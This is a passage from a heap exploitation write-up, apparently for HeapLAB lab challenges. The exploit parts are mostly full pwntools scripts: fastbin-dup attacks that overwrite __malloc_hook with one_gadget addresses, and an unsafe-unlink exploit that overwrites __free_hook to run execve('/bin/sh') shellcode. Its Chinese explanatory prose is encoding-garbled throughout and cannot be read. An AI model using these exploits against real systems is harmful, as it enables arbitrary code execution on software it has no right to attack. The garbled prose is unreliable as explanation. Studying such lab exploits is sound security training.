<p><img src="Heap.assets/image-20220820174021017.png" alt="image-20220820174021017"></p>
</li>
<li><p>malloc fake chunk</p>
<pre><code class="python"># malloc the fake chunk
malloc(0x28, b&quot;win !&quot;)
</code></pre>
<p>ä½†æ­¤æ—¶ç”±äºæˆ‘ä»¬ä¹‹å‰å¹¶æ²¡æœ‰è®¾ç½®è™šå‡çš„sizeå­—æ®µï¼Œæ‰€ä»¥ä¼šå‡ºç°ä¸€ä¸ªä¸­æ–­ã€‚å¦‚æœæˆ‘ä»¬è®¾ç½®äº†é‚£ä¸ªè™šå‡çš„å­—æ®µï¼Œä¾¿ä¿®æ”¹å®Œæˆ</p>
<p><img src="Heap.assets/image-20220820174213853.png" alt="image-20220820174213853"></p>
</li>
<li><p>success</p>
<p><img src="Heap.assets/image-20220820175408919.png" alt="image-20220820175408919"></p>
</li>
</ul>
<h5 id="exp-ã€‹modify"><a href="#exp-ã€‹modify" class="headerlink" title="exp-ã€‹modify"></a>exp-ã€‹modify</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# Set the username field.
username = p64(0) + p64(0x31)
io.sendafter(b&quot;username: &quot;, username)
io.recvuntil(b&quot;&gt; &quot;)

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b&quot;A&quot;*0x28)
chunk_B = malloc(0x28, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
chunk_1 = malloc(0x28, p64(elf.sym.user))

# malloc_twice
malloc(0x28, b&quot;1&quot;)
malloc(0x28, b&quot;2&quot;)

# malloc the fake chunk
malloc(0x28, b&quot;win !&quot;)
# =============================================================================

io.interactive()
</code></pre>
<h5 id="æ€è·¯åˆ†æ-ã€‹drop-shell"><a href="#æ€è·¯åˆ†æ-ã€‹drop-shell" class="headerlink" title="æ€è·¯åˆ†æ-ã€‹drop shell"></a>æ€è·¯åˆ†æ-ã€‹drop shell</h5><ul>
<li>fastbin dup</li>
<li>__malloc_hook -&gt; one_gadget</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨-ã€‹drop-shell"><a href="#æ¼æ´åˆ©ç”¨-ã€‹drop-shell" class="headerlink" title="æ¼æ´åˆ©ç”¨-ã€‹drop shell"></a>æ¼æ´åˆ©ç”¨-ã€‹drop shell</h5><ul>
<li><p>è™šå‡å­—æ®µçš„å¤§å°ä¸º0x7f -&gt; æ„å‘³ç€æˆ‘ä»¬è¦ç”³è¯·0x68çš„chunkã€‚ç„¶åfastbin dup å°†å…¶fdä¿®æ”¹è‡³__malloc_hook - 35 çš„ä½ç½®ã€‚</p>
<pre><code class="python"># Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b&quot;A&quot;*0x28)
chunk_B = malloc(0x68, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))
</code></pre>
</li>
<li><p>å¡«å……0x13çš„åƒåœ¾æ•°æ®ï¼Œæ¥ç€å¡«å…¥one_gadgetçš„åœ°å€ã€‚</p>
<pre><code class="python"># malloc twice
malloc(0x68, b&#39;0&#39;)
malloc(0x68, b&#39;1&#39;)

# malloc fake chunk
# if no limit malloc&#39;s count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b&#39;/bin/sh\x00&#39;)))

# malloc(sh_addr, b&quot;&quot;)
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b&#39;&#39;)
</code></pre>
</li>
<li><p>drop shell</p>
<p><img src="Heap.assets/image-20220820184826255.png" alt="image-20220820184826255"></p>
</li>
</ul>
<h5 id="exp-ã€‹drop-shell"><a href="#exp-ã€‹drop-shell" class="headerlink" title="exp-ã€‹drop shell"></a>exp-ã€‹drop shell</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = b&quot;ferity-fan&quot;
io.sendafter(b&quot;username: &quot;, username)
io.recvuntil(b&quot;&gt; &quot;)

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b&quot;A&quot;*0x28)
chunk_B = malloc(0x68, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))

# malloc twice
malloc(0x68, b&#39;0&#39;)
malloc(0x68, b&#39;1&#39;)

# malloc fake chunk
# if no limit malloc&#39;s count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b&#39;/bin/sh\x00&#39;)))

# malloc(sh_addr, b&quot;&quot;)
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b&#39;&#39;)
# =============================================================================

io.interactive()
</code></pre>
<h4 id="ç¤ºä¾‹äºŒï¼šfastbin-dup-2"><a href="#ç¤ºä¾‹äºŒï¼šfastbin-dup-2" class="headerlink" title="ç¤ºä¾‹äºŒï¼šfastbin_dup_2"></a>ç¤ºä¾‹äºŒï¼šfastbin_dup_2</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/fastbin_dup_2/fastbin_dup_2">fastbin_dup_2</a></p>
</blockquote>
<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½-3"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½-3" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><pre><code class="sh">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/challenge-fastbin_dup]
â””â”€$ checksec fastbin_dup_2 
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/challenge-fastbin_dup/fastbin_dup_2&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="ç¨‹åºåˆ†æ-3"><a href="#ç¨‹åºåˆ†æ-3" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>æ²¡æœ‰é™åˆ¶double freeï¼Œä½†æ­¤æ—¶çš„chunkç”³è¯·ä¸äº†0x68çš„å¤§å°ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨é‚£ä¸ª<code>__malloc_hook - 35</code>çš„ä½ç½®äº†ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“<code>main_arena</code>ä¸Šå­˜ç€å„ç§fastbinçš„fdæŒ‡é’ˆï¼Œå¯ä»¥ä½¿ç”¨ä¸¤æ¬¡fastbin dupï¼Œä¸€æ¬¡ç”¨æ¥å†™ sizeå­—æ®µï¼Œä¸€æ¬¡ç”¨æ¥å†™fdå­—æ®µï¼Œæ­¤æ—¶çš„fdå­—æ®µæ˜¯main_arenaä¸Šçš„æŸä¸ªä½ç½®ï¼ˆè¦ä¸ä¼ªé€ çš„sizeç›¸å¯¹åº”ï¼‰ï¼Œæ¥ç€mallocæ¥è¦†ç›–è‡³top_chunkçš„åœ°å€ï¼Œä¿®æ”¹è‡³<code>__malloc_hook - 35 </code>çš„ä½ç½®ï¼Œæ­¤æ—¶ç»§ç»­mallocé€‚å½“çš„å¤§å°å³å¯è¦†ç›–è‡³<code>__malloc_hook</code>ï¼Œå°†å…¶è¦†ç›–ä¸ºone_gadgetçš„åœ°å€ã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°æ­¤æ—¶çš„å¯„å­˜å™¨çŠ¶æ€å¹¶ä¸æ»¡è¶³ä»»ä½•ä¸€ä¸ªone_gadgetæ‰€éœ€è¦çš„æ¡ä»¶ï¼Œä¸è¿‡ç»æˆ‘ä»¬è°ƒè¯•å‘ç°ç›¸åº”çš„ä½ç½®å­˜ç€æ˜¯æˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„å€¼ï¼Œå°†å…¶ä¿®æ”¹ä¸º<code>-s\x00</code>å³å¯ã€‚</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned int index; // [rsp+14h] [rbp-7Ch]
  size_t n; // [rsp+18h] [rbp-78h]
  unsigned __int64 na; // [rsp+18h] [rbp-78h]
  char *m_array[13]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  CHALLENGE: Fastbin Dup&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 13LL);
      puts(&quot;2) free&quot;);
      puts(&quot;3) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;index: &quot;);
      na = read_num();
      if ( na &gt;= index )
        puts(&quot;invalid index&quot;);
      else
        free(m_array[na]);
    }
    if ( num == 3 )
      break;
    if ( num == 1 )
    {
      if ( index &gt; 0xC )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        n = read_num();
        if ( n &gt; 0x58 &amp;&amp; (n &lt;= 0x68 || n &gt; 0x78) )
        {
          puts(&quot;fast chunks only (excluding 0x70)&quot;);
        }
        else
        {
          m_array[index] = (char *)malloc(n);
          if ( m_array[index] )
          {
            printf(&quot;data: &quot;);
            read(0, m_array[index++], n);
          }
          else
          {
            puts(&quot;request failed&quot;);
          }
        }
      }
    }
  }
  exit(0);
}
</code></pre>
<h5 id="æ¼æ´åˆ©ç”¨-2"><a href="#æ¼æ´åˆ©ç”¨-2" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ä¸¤æ¬¡fastbin dupï¼Œä¼ªé€ ä¸€ä¸ªsizeå­—æ®µä»¥åŠä¸€ä¸ªfdå­—æ®µ</p>
<p><img src="Heap.assets/image-20220821113749445.png" alt="image-20220821113749445"></p>
</li>
<li><p>ç»§ç»­mallocï¼Œå°†top chunkçš„åœ°å€è¦†ç›–ï¼Œä¸ºäº†æ–¹ä¾¿è§‚çœ‹æˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸º0xdeadbeef</p>
<p><img src="Heap.assets/image-20220821114003739.png" alt="image-20220821114003739"></p>
<p>ä¸ºäº†æ»¡è¶³ä¸€ä¸ªå¯¹sizeå­—æ®µçš„æ£€æŸ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨<code>__malloc_hook - 35</code>æ¥è¦†ç›–top_chunkçš„åœ°å€ã€‚</p>
<pre><code class="c">--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -4076,6 +4076,9 @@ _int_malloc (mstate av, size_t bytes)
       victim = av-&gt;top;
       size = chunksize (victim);
 
+      if (__glibc_unlikely (size &gt; av-&gt;system_mem))
+        malloc_printerr (&quot;malloc(): corrupted top size&quot;);
+
       if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
         {
           remainder_size = size - nb;
</code></pre>
</li>
<li><p>ç»§ç»­mallocï¼Œä½¿ç”¨one_gadgetæ¥è¦†ç›–<code>__malloc_hook</code>ï¼Œä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿï¼Œæˆ‘ä»¬ä»ç„¶ä½¿ç”¨0xdeadbeefæ¥ä»£æ›¿</p>
<p><img src="Heap.assets/image-20220821115406447.png" alt="image-20220821115406447"></p>
<p>ç»§ç»­mallocï¼Œè§‚å¯Ÿæ˜¯å¦æ»¡è¶³one_gadgetçš„æ¡ä»¶</p>
<p><img src="Heap.assets/image-20220821115524129.png" alt="image-20220821115524129"></p>
<p>æ­¤æ—¶çš„å¯„å­˜å™¨çŠ¶æ€</p>
<p><img src="Heap.assets/image-20220821115602029.png" alt="image-20220821115602029"></p>
<p>æ­¤æ—¶çš„æ ˆå¸§çŠ¶æ€</p>
<p><img src="Heap.assets/image-20220821115655834.png" alt="stck"></p>
<p>å¯ä»¥è§‚å¯Ÿåˆ°å¹¶ä¸æ»¡è¶³ä»»ä½•ä¸€ä¸ªone_gadgetçš„åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸‰ä¸ªone_gadgetï¼Œåªè¦æ±‚rsp+0x50çš„ä½ç½®æ‰€å­˜çš„å€¼ä¸º0å³å¯ï¼Œæ­¤æ—¶çš„å€¼æˆ‘ä»¬å‘ç°æ˜¯å¯ä»¥æœ‰æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ï¼Œé‚ä¿®æ”¹å³å¯ã€‚</p>
</li>
<li><p>drop a shell</p>
<p><img src="Heap.assets/image-20220821120333916.png" alt="image-20220821120333916"></p>
</li>
</ul>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup_2&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b&quot;A&quot;*8)
chunk_B = malloc(0x48, b&quot;B&quot;*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48, p64(0x61))
malloc(0x48, b&quot;C&quot;*0x48)
malloc(0x48, b&quot;D&quot;*0x48)

# other fastbin dup
chunk_E = malloc(0x58, b&quot;E&quot;*0x58)
chunk_F = malloc(0x58, b&quot;F&quot;*0x58)

free(chunk_E)
free(chunk_F)
free(chunk_E)

malloc(0x58, p64(libc.sym.main_arena + 0x20))
# malloc(0x58, b&quot;G&quot;*0x58)
malloc(0x58, b&quot;-s\x00&quot;)
malloc(0x58, b&quot;H&quot;*0x58)

# over_write the top_chunk
malloc(0x58, b&quot;Y&quot;*0x30 + p64(libc.sym.__malloc_hook - 35))
# malloc(0x58, b&quot;Y&quot;*0x30 + p64(0xdeadbeef))

# malloc fake chunk
malloc(0x28, b&quot;Z&quot;*0x13 + p64(libc.address + 0xe1fa1))
# malloc(0x28, b&quot;Z&quot;*0x13 + p64(0xdeadbeef))

# drop a shell
malloc(0x10, b&quot;&quot;)

# =============================================================================
io.interactive()                
</code></pre>
<h4 id="ç¤ºä¾‹ä¸‰ï¼š0CTF-2017-babyheap"><a href="#ç¤ºä¾‹ä¸‰ï¼š0CTF-2017-babyheap" class="headerlink" title="ç¤ºä¾‹ä¸‰ï¼š0CTF 2017 babyheap"></a>ç¤ºä¾‹ä¸‰ï¼š0CTF 2017 babyheap</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§<a href="attachment%5C0ctf_2017_babyheap%5Cbabyheap">babyheap</a></p>
</blockquote>
<h3 id="Unlink-old"><a href="#Unlink-old" class="headerlink" title="Unlink(old)"></a>Unlink(<del>old</del>)</h3><h4 id="è¯¦æƒ…-2"><a href="#è¯¦æƒ…-2" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p>ä¸ºäº†é¿å…å †å†…å­˜è¿‡åº¦ç¢ç‰‡åŒ–ï¼Œå½“ä¸€ä¸ªå †å—ï¼ˆfastbin chunk é™¤å¤–ï¼‰è¢«é‡Šæ”¾æ—¶ï¼Œlibcä¼šæŸ¥çœ‹å…¶å‰åå †å—æ˜¯å¦å¤„äºè¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œå°±å°†å‰é¢æˆ–åé¢çš„å †å—ä¸­ä»binsä¸­å–å‡ºï¼Œå¹¶äºå½“å‰å †å—åˆå¹¶ï¼Œè¿™ä¸ªå–å‡ºçš„è¿‡ç¨‹ä¾¿æ˜¯unlinkã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æ­¤æ—¶å¼€è¾Ÿäº†6ä¸ªå¤§å°ä¸º0xa0çš„å †å—ï¼š<img src="Heap.assets/image-20220903173420886.png" alt="image-20220903173420886"></p>
<p>æ­¤æ—¶æˆ‘ä»¬é‡Šæ”¾é è¿‘top chunkçš„å †å—ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¯¥å †å—ä¼šå’Œtop chunkåˆå¹¶<img src="Heap.assets/image-20220903173447945.png" alt="image-20220903173447945"></p>
<p>æ­¤æ—¶æˆ‘ä»¬é‡Šæ”¾ç¬¬ä¸€ä¸ªç”³è¯·çš„å—ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªå—å·²è¢«æ”¾å…¥äº†unsortedbinï¼Œä¸”fd,bkæŒ‡é’ˆå‡è¢«èµ‹å€¼ï¼Œä¸‹ä¸€ä¸ªchunkçš„prev_sizeåŠprev_inuseå‡æœ‰æ”¹å˜<img src="Heap.assets/image-20220903173735492.png" alt="image-20220903173735492"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å†å»é‡Šæ”¾ä¸´è¿‘å—ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸¤ä¸ªchunkåˆå¹¶æˆç«‹ä¸€ä¸ªchunkã€‚</p>
<p><img src="Heap.assets/image-20220903174353252.png" alt="image-20220903174353252"></p>
<p><img src="Heap.assets/image-20220903175411826.png" alt="image-20220903175411826"></p>
<p>åœ¨è¿™ä¸ªunlinkçš„è¿‡ç¨‹ä¸­å­˜åœ¨ç€ä¸€ä¸ªfd,bkçš„åå°„å†™å…¥ï¼Œæˆ‘ä»¬æ­¤æ¼æ´çš„åˆ©ç”¨åŒæ ·ä¹Ÿæ˜¯æ ¹æ®äºæ­¤ï¼š</p>
<ul>
<li><p>æˆ‘ä»¬å…ˆåˆ›å»º5ä¸ªå¤§å°ä¸º0x90çš„å †å—ï¼š<img src="Heap.assets/image-20220903181246083.png" alt="image-20220903181246083"></p>
</li>
<li><p>æ¥ç€æˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºæ¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªå †å—çš„fd, bkä»¥åŠç¬¬å››ä¸ªå †å—çš„prev_sizeï¼Œprev_inuse:<img src="Heap.assets/image-20220903182117957.png" alt="image-20220903182117957"></p>
</li>
<li><p>æˆ‘ä»¬ç»§ç»­é‡Šæ”¾ç¬¬å››ä¸ªå—ï¼Œæ­¤æ—¶ç¬¬å››ä¸ªå—çš„prev_inuseä¸º0ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªå †å—ä¼šå‘å‰åˆå¹¶ã€‚</p>
<p><img src="Heap.assets/image-20220903182811281.png" alt="image-20220903182811281"></p>
</li>
</ul>
<p>unsafe unlink ç›¸åº”ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="c">#define unlink(AV, P, BK, FD) {\
    FD = P-&gt;fd;\
    BK = P-&gt;bk;\
    FD-&gt;bk = BK;\
    BK-&gt;fd = FD;\
    if (!in_smallbin_range (P-&gt;size)\
        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {\
            if (FD-&gt;fd_nextsize == NULL) {\
                if (P-&gt;fd_nextsize == P)\
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\
                else {\
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\
                }\
            } else {\
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\
            }\
    }\
}
</code></pre>
<h4 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><p>è¿™é¡¹æŠ€æœ¯åªèƒ½åœ¨GLIBCç‰ˆæœ¬&lt;=2.3.3çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œsafe unlink  æ˜¯åœ¨2004å¹´GLIBCç‰ˆæœ¬2.3.4ä¸­å¼•å…¥çš„ï¼Œè€ŒGLIBCç‰ˆæœ¬å¦‚æ­¤ä¹‹è€å¹¶ä¸å¸¸è§ã€‚è¿™é¡¹æŠ€æœ¯æœ€åˆæ˜¯ç”¨æ¥å¯¹ä»˜æ²¡æœ‰NX/DEPçš„å¹³å°çš„ï¼Œè¿™é‡Œä¹Ÿæ˜¯è¿™æ ·æè¿°çš„ã€‚2003å¹´ï¼ŒAMDåœ¨ä»–ä»¬çš„æ¶ˆè´¹è€…æ¡Œé¢å¤„ç†å™¨ä¸­å¼•å…¥äº†ç¡¬ä»¶NXæ”¯æŒï¼Œéšåè‹±ç‰¹å°”åœ¨2004å¹´ä¹Ÿå¼•å…¥äº†ï¼Œå› æ­¤æ²¡æœ‰è¿™ç§ä¿æŠ¤çš„ç³»ç»Ÿå¹¶ä¸å¸¸è§ã€‚</p>
<h4 id="ç¤ºä¾‹ä¸€-unsafe-unlink"><a href="#ç¤ºä¾‹ä¸€-unsafe-unlink" class="headerlink" title="ç¤ºä¾‹ä¸€ unsafe_unlink"></a>ç¤ºä¾‹ä¸€ unsafe_unlink</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§ <a href="attachment/unsafe_unlink/unsafe_unlink">unsafe_unlink</a></p>
</blockquote>
<h5 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h5><pre><code class="bash">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/unsafe_unlink]
â””â”€$ checksec unsafe_unlink
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/unsafe_unlink/unsafe_unlink&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
    RUNPATH:  &#39;../.glibc/glibc_2.23_unsafe-unlink&#39;
</code></pre>
<h5 id="æ¼æ´åˆ©ç”¨-3"><a href="#æ¼æ´åˆ©ç”¨-3" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ç”±äºæ˜¯å¤è€æ—¶ä»£çš„unlinkï¼Œæ²¡æœ‰åŸºäºfdï¼ŒåŠbkçš„å®‰å…¨æ£€æŸ¥ï¼Œåˆ©ç”¨unlinkçš„åå°„å†™å…¥æ¥ä¿®æ”¹<code>__free_hook</code>ï¼Œä»è€Œæ‰§è¡Œshellcode</p>
<p><img src="Heap.assets/image-20220916151609194.png" alt="image-20220916151609194"></p>
</li>
</ul>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;unsafe_unlink&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b&quot;heap @ &quot;)
heap = int(io.recvline(), 16)
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# Prepare execve(&quot;/bin/sh&quot;) shellcode with a jmp over where the fd will be written.
shellcode = asm(&quot;jmp shellcode;&quot; + &quot;nop;&quot;*0x16 + &quot;shellcode:&quot; + shellcraft.execve(&quot;/bin/sh&quot;))

chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

fd = libc.sym.__free_hook - 0x18
bk = heap + 0x20

edit(chunk_A, pack(fd) + pack(bk) + shellcode.ljust(0x70, b&#39;\x00&#39;) + p64(0x90)*2)
free(chunk_B)
free(chunk_A)

# =============================================================================

io.interactive()
</code></pre>
<h3 id="Unlink-new"><a href="#Unlink-new" class="headerlink" title="Unlink(new)"></a>Unlink(<del>new</del>)</h3><h4 id="è¯¦æƒ…-3"><a href="#è¯¦æƒ…-3" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p><img src="Heap.assets/image-20220916180441088.png" alt="image-20220916180441088"></p>
<pre><code class="c">/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);

  mchunkptr fd = p-&gt;fd;
  mchunkptr bk = p-&gt;bk;

  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
    malloc_printerr (&quot;corrupted double-linked list&quot;);

  fd-&gt;bk = bk;
  bk-&gt;fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)
    {
      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p
      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)
    malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);

      if (fd-&gt;fd_nextsize == NULL)
    {
